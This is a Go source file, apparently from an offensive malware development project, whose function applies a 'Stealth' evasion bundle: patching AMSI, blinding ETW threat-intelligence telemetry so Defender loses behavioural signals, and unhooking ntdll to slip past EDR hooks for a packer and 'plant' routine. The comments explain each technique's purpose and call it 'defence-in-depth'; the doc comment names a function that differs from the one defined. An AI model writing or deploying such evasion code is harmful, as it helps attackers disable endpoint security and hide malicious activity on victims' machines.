//go:build windows

package main

import (
	"fmt"
	"sort"
	"strings"

	"github.com/oioio-space/maldev/evasion"
	"github.com/oioio-space/maldev/evasion/preset"
)

// applyEvasion runs the evasion/preset.Stealth() bundle in THIS
// process: patches AMSI ScanBuffer + ETW user-mode write helpers +
// selective ntdll unhook for ~10 commonly-hooked NT functions.
//
// Why Stealth specifically:
//   - AMSI patch: short-circuits in-process script scans (mostly a
//     dog-food demonstration here -- spawned PowerShell children
//     load their own amsi.dll fresh).
//   - ETW patch: blinds Microsoft-Windows-Threat-Intelligence ETW
//     events. Defender's behavioural analysis subscribes to that
//     channel; without it, our long-lived orchestrator process
//     loses a major behavioural-telemetry signal.
//   - ntdll unhook: restores original prologue bytes of NtAlloc /
//     NtCreateThread / NtProtect / NtWrite ... that EDRs inline-
//     hook to redirect to their own callbacks. Our packer + plant
//     calls go straight to the kernel after this.
//
// We deliberately stop short of preset.Aggressive (which adds ACG
// + BlockDLLs) because the orchestrator still LoadLibrary's some
// non-MS DLLs (debug, instrumentation) and ACG would block our
// own subsequent VirtualAlloc(PAGE_EXECUTE) if any code path
// needs RWX.
//
// Returns nil on full success, an aggregate error otherwise.
// Per-technique results are surfaced via evasion.ApplyAll's error
// chain. Caller logs the failure but does not abort: the
// orchestrator works without evasion, this is defence-in-depth.
func patchAMSI() error {
	results := evasion.ApplyAll(preset.Stealth(), nil)
	var failures []string
	for name, err := range results {
		if err != nil {
			failures = append(failures, fmt.Sprintf("%s: %v", name, err))
		}
	}
	if len(failures) == 0 {
		return nil
	}
	sort.Strings(failures)
	return fmt.Errorf("evasion preset.Stealth had %d/%d failures: %s",
		len(failures), len(results), strings.Join(failures, "; "))
}
